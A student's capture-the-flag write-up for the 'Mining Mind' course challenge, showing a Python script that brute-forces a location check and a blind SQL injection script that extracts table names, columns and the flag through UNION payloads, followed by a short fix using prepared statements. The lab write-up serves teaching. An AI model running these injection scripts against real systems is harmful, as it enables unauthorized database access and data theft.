**Name:** flofriday

**Points:** Not yet graded 

<hr>

Mining Mind
===========

Overview
--------

[mining mind](https://miningmind.hackthe.space/) is a website for a product to mine cryptocoins in your sleep. The website also has a demo page were users in the right region can mine crypto with any attached USB device.

Vulnerability
-------------

The SQL injection vulnerability is in the `/api/usb` route of the application to which the user sends the information of their USB device via [`POST` request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST) and which returns a bool if  the device is supported.

Asuming the webapplication is written in [PHP](https://www.php.net/) the vulnerable code probably looks something like:

```php
<?php
$json = file_get_contents('php://input');
$obj = json_decode($json);
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
$query = "SELECT * FROM interfaces WHERE product ='" . $obj->product_name . "' AND manufacturer ='" . $obj->manufacturer_name ."';";
$sth = $db->query($query);

...
```

Exploitation
------------

During the exploitation I was on a Discord call with █████, █████ and █████, we explored the challenge together and discussed approaches created our payload on our own and never shared the flag.

On the [website](https://miningmind.hackthe.space/) I first clicked on "Try the demo!" and after allowing the webiste to access my location I received the error "You are too far away". Next, I installed [Burp Suite](https://portswigger.net/burp) and quickly found out that the application sends the latidtude and the logititude to the route `/api/auth` via a POST request. 

My first attempt was to fake my location to one in London, since the challenge description mentions a paper written in there. Howerver, this and a couple other attempts to guess the right location failed so in the end I wrote myself a  [Python](https://www.python.org/) script in a [Jupyter Notebook](https://jupyter.org/) to bruteforce the latitude and logtitude:

```python
import requests
import math

headers = {
    'authority': 'miningmind.hackthe.space',
    'content-type': 'application/json',
}

# Bruteforce a axis
# Either lat or lon must be None 
def bruteforce(start, end, lat, lon):
    best = None
    best_d = math.inf
    force_lon = lon == None

    for round in range(5):
        step = (end - start) / 10

        # Search 10 points in the sample space and save the best
        for i in range(10):
            guess = start + step*i

            if force_lon:
                lon = guess
            else:
                lat = guess

            data = f'{{"latitude": {lat}, "longitude": {lon} }}'
            res = requests.post('https://miningmind.hackthe.space/api/auth', headers=headers, data=data)
            if res.status_code != 200:
                print(f'ERROR: {res}')
                return

            if res.json()['distance'] < best_d:
                best = guess
                best_d = res.json()['distance']

        # Decrease sample space
        start = best - step
        end = best + step

    return (best, best_d)

# Bruteforce the logtiitude
(lon, _) = bruteforce(-180, 180, 0, None)
print(f'Best longitude: {lon}')

# Bruteforce the latitude
(lat, dist) = bruteforce(-90, 90, None, lon)
print(f'Best latitude: {lat}')

print('---- Results ----')
print(f'Longitude: {lat}, Latitude: {lon}, Remaining distance: {dist}')
```

This script first bruteforces the longitude and then the latitude. To bruteforece the longitude it starts first with the complete search space `-180` to `180` and samples `10`points in that range. The point with the shortest distance will be saved and in the next round we decrease the search space to 1 step size before and after the best result. In total we will do 5 of  those rounds (4 times decreasing the samplespace) and then we will do the same for the latitude.

In the end the script will print the line:

```
Longitude: -157.7472, Latitude: -45.4176, Remaining distance: 3.91
```

Now we can try the demo again and in Burp intercept the request to `/api/auth` and change the longitude and latitude to the values we bruteforced. With that we will receive a response that sets us a session cookie and if we reload the page, we get asked to select an USB device (Note: this only works in [Chrome](https://www.google.com/chrome/index.html) as this is the only browser that supports the [WebUSB API](https://developer.mozilla.org/en-US/docs/Web/API/USB)). However, whatever device we are selecting we allways get an error message that the device is not supported.

Next, I found out that the website sends the selected USB device to the `/api/usb` endpoint. The sever then responds with a JSON `{"supported": false}`. Since the challenge is tagged with SQL I tried to create a sql injection in the request payload:

```json
{"product_name":"'union Select 'flotschi' #","manufacturer_name":"flofriday"}'
```

The server now responded with supported set to `true`, and the website now showed me that mining is in progress but nothing else changed. On the up side we now have an SQL vulnerability and we get a boolean from the sql database which is set if a query, we can define, returns one or more rows. With this feedback we can beginn to leak data from the database.

> On the upside satzt anpassen

This task is simply impossible to do per hand so I wrote this script to leak all non internal tables. At that point I knew already that the database is a MySQL database from some errormessages which leaked the error code and only MySQL has those codes. The script concatinates all tables to a single string and then tries to bruteforce that string.

```python
import requests
import string

headers = {
    "authority": "miningmind.hackthe.space",
    "Feature-Policy": "usb *;",
    "content-type": "application/json",
    "Cookie": "session=eyJ0ZXN0ZXIiOnRydWV9.E23igA.27fDUiaCczMYeoXyP1LxKLOQ-JY",
}


def exec_query(query):
    result = ""
    quit = False
    while not quit:
        for c in string.ascii_letters + string.digits + ",{}_":
            maybe = result + c
            data = f"""{{"product_name":"'UNION {query(maybe)}#", "manufacturer_name":"me"}}"""
            response = requests.post(
                "https://miningmind.hackthe.space/api/usb",
                headers=headers,
                data=data,
            )
            if response.status_code != 200:
                print(
                    f'Error {response.status_code} when trying "{maybe}"\n{response.text}'
                )
                return

            if not response.json()["supported"]:
                continue

            print(maybe)
            result = maybe
            break

        else:
            print("Nothing more found :(")
            quit = True


exec_query(lambda maybe: f"""
SELECT 1 FROM information_schema.tables 
WHERE
    (SELECT GROUP_CONCAT(table_name SEPARATOR ',') 
    FROM information_schema.tables
    WHERE NOT table_schema = 'information_schema') 
    LIKE '{maybe}%'""".replace("\n", "")
)
```

With this we receive the following tables `brains,interfaces,locations`. In the callenge description is the following sentence:

>  Exploit this [website](https://miningmind.hackthe.space) to get the flag out of my brain!

So a `brains` table sounds more than promising. Before we can read rows from the brains table we first need to know what columns are in the table. Therefore I could still use the function from the last script, simply with a new lambda function:

```python
exec_query(lambda maybe: f"""
SELECT 1 FROM information_schema.tables 
WHERE
    (SELECT GROUP_CONCAT(column_name SEPARATOR ',') 
    FROM information_schema.columns
    WHERE table_name = 'brains') 
    LIKE '{maybe}%'""".replace("\n", "")
)
```

Which leaks the columns `id,model`. The flag propably isn't in the `id` column so I started to leak the model columns with the same technique. However there seamed to be **a lot** of padding in the first row, so I changed my script to search for a substring that starts with `WUT` as all flags in this lecture must start with that prefix.

```python
exec_query(lambda maybe: f"""
SELECT 1 FROM information_schema.tables 
WHERE
    (SELECT model FROM brains) 
    LIKE BINARY '%WUT{maybe}%'""".replace("\n", "")
)
```

With this we can finally leak the flag which is `WUT{n3x7_1ll_s3ll_my_s0ul_4_NFTs}` and an amazing [NFT meme](https://www.youtube.com/watch?v=mrNOYudaMAc).

Solution
--------

The problem here (as with all SQL injections) is that the application doesn't sanitize the input correctly. This could be prevented by using prepared statements, where the DBMS escapes the input for us.
